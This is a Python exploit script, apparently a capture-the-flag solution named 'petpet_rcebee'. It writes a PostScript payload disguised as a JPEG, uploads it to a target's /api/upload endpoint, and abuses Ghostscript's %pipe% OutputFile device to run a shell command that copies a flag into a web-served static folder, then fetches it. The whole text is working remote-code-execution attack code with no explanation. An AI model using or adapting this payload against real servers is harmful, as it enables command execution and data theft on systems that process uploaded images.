import requests
import sys

if len(sys.argv) != 2:
    print(f"Usage: python3 petpet_rcebee ip:port")
    sys.exit(1)

host = sys.argv[1]
url_upload = f"http://{host}/api/upload"
url_flag = f"http://{host}/static/petpets/flag.txt"

payload = """%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{  null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag >> /app/application/static/petpets/flag.txt) 
currentdevice putdeviceprops"""

with open("remote.jpg", "w") as f:
    f.write(payload)

with open("remote.jpg", "rb") as f:
    files = {"file": ("remote.jpg", f, "image/jpeg")}
    requests.post(url_upload, files=files)

res = requests.get(url_flag)
print(res.text)
